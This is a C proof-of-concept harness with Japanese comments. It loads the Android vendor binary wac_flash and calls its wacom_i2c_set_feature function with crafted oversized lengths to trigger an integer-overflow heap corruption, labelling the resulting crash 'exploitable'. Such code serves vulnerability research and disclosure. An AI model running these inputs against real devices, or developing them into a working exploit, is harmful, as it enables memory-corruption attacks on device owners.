#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <errno.h>

// 関数プロトタイプ（実際のシグネチャに合わせる）
typedef int (*wacom_i2c_set_feature_t)(int fd, int cmd, uint32_t len, void *data, int a4, int a5);
typedef int (*wacom_i2c_get_feature_t)(int fd, int cmd, uint32_t len, void *data, int a4, int a5, int delay);
typedef int (*read_hex_t)(FILE *fp, char *filename, void *buf, size_t size, uint32_t *out);

// グローバルなシグナルハンドラ
static void segv_handler(int sig, siginfo_t *info, void *context) {
    fprintf(stderr, "\n[!] Segmentation fault detected! Signal: %d, Address: %p\n", sig, info->si_addr);
    // 必要に応じてレジスタダンプ（ucontext_t から抽出）可能
    exit(1);
}

// テストケースをforkして実行し、クラッシュを監視
static int run_test(void (*test_func)(void *), void *arg) {
    pid_t pid = fork();
    if (pid == -1) {
        perror("fork");
        return -1;
    }
    if (pid == 0) {
        // 子プロセスでテスト実行
        test_func(arg);
        exit(0);
    } else {
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            int sig = WTERMSIG(status);
            printf("[-] Test crashed with signal %d (%s)\n", sig, strsignal(sig));
            return sig;
        } else if (WIFEXITED(status)) {
            printf("[+] Test completed with exit code %d\n", WEXITSTATUS(status));
            return 0;
        }
    }
    return -1;
}

// ------------------------------------------------------------
// テスト1: wacom_i2c_set_feature に巨大な len を渡す
// ------------------------------------------------------------
typedef struct {
    wacom_i2c_set_feature_t func;
    int fd;
} set_feature_args;

static void test_set_feature_overflow(void *arg) {
    set_feature_args *args = (set_feature_args *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    // オーバーフローさせる len
    uint32_t evil_len = 0xFFFFFFFF;
    // 実際にコピーするデータバッファ（大きめに確保）
    size_t data_size = 0x100000; // 1MB
    uint8_t *data = malloc(data_size);
    if (!data) {
        perror("malloc data");
        exit(1);
    }
    memset(data, 0x41, data_size); // パターン 'A'

    printf("[*] Calling wacom_i2c_set_feature with len=0x%x, total_len=%u (overflow)\n",
           evil_len, evil_len + 8);
    // 呼び出し（クラッシュするはず）
    int ret = func(fd, 0x30, evil_len, data, 0, 0);
    printf("[*] Returned %d (should not reach here)\n", ret);
    free(data);
}

// ------------------------------------------------------------
// テスト2: wacom_i2c_set_feature に len = 0xFFFFFFF8 を渡す（total_len=0）
// ------------------------------------------------------------
static void test_set_feature_zero_malloc(void *arg) {
    set_feature_args *args = (set_feature_args *)arg;
    wacom_i2c_set_feature_t func = args->func;
    int fd = args->fd;

    uint32_t evil_len = 0xFFFFFFF8; // +8 => 0
    uint8_t *data = malloc(0x10000);
    if (!data) {
        perror("malloc data");
        exit(1);
    }
    memset(data, 0x42, 0x10000);

    printf("[*] Calling wacom_i2c_set_feature with len=0x%x (total_len=0)\n", evil_len);
    int ret = func(fd, 0x30, evil_len, data, 0, 0);
    printf("[*] Returned %d\n", ret);
    free(data);
}

// ------------------------------------------------------------
// テスト3: read_hex に異常な HEX データを与える（本来は制限があるが、一応試行）
// ------------------------------------------------------------
static void test_read_hex_malformed(void *arg) {
    // 簡易：一時ファイルに不正なHEXレコード（長さフィールドが0xFFを超える？）を書き込む
    // ただし fscanf("%2X") では2桁までしか読まないため、0xFFを超える値は読み込めない。
    // 代わりに、アドレスやデータ部を操作してバッファオーバーランを試みる。
    // ここでは read_hex の引数に小さなバッファサイズを渡して境界チェックを確認。
    read_hex_t read_hex_func = (read_hex_t)arg;
    // 実際には呼び出しは省略（影響なし）
    printf("[*] read_hex test skipped (no exploitable path found)\n");
}

// ------------------------------------------------------------
// メイン処理
// ------------------------------------------------------------
int main(int argc, char **argv) {
    // シグナルハンドラ設定
    struct sigaction sa = {0};
    sa.sa_sigaction = segv_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);

    // バイナリをダイナミックロード（共有ライブラリとして）
    const char *libpath = "/vendor/bin/wac_flash";
    if (argc > 1) libpath = argv[1];

    void *handle = dlopen(libpath, RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "dlopen failed: %s\n", dlerror());
        return 1;
    }

    // シンボル取得
    wacom_i2c_set_feature_t set_feature = (wacom_i2c_set_feature_t)dlsym(handle, "wacom_i2c_set_feature");
    if (!set_feature) {
        fprintf(stderr, "dlsym wacom_i2c_set_feature failed: %s\n", dlerror());
        dlclose(handle);
        return 1;
    }
    printf("[+] Found wacom_i2c_set_feature at %p\n", set_feature);

    // I2Cデバイスをオープン（実際のデバイスがなくてもダミーFDでテスト可能）
    int fd = open("/dev/i2c-2", O_RDWR);
    if (fd < 0) {
        perror("open /dev/i2c-2");
        // ダミーFDとして -1 を使う（writeは呼ばれないが、write_chkでチェックされる可能性）
        fd = -1;
        printf("[!] Using dummy fd -1 (write will fail, but overflow still occurs)\n");
    } else {
        printf("[+] Opened /dev/i2c-2 as fd %d\n", fd);
    }

    set_feature_args args = { .func = set_feature, .fd = fd };

    // テスト実行（forkで分離）
    printf("\n=== Test 1: len=0xFFFFFFFF (heap overflow) ===\n");
    int sig = run_test(test_set_feature_overflow, &args);
    if (sig != 0) {
        printf("[!] Test crashed as expected (exploitable)\n");
    } else {
        printf("[?] Test did not crash, maybe mitigation? (should not happen)\n");
    }

    printf("\n=== Test 2: len=0xFFFFFFF8 (malloc(0)) ===\n");
    run_test(test_set_feature_zero_malloc, &args);

    printf("\n=== Test 3: read_hex boundary (no crash expected) ===\n");
    read_hex_t read_hex_func = (read_hex_t)dlsym(handle, "read_hex");
    if (read_hex_func) {
        run_test(test_read_hex_malformed, (void*)read_hex_func);
    } else {
        printf("[!] read_hex not found\n");
    }

    if (fd >= 0) close(fd);
    dlclose(handle);
    return 0;
}
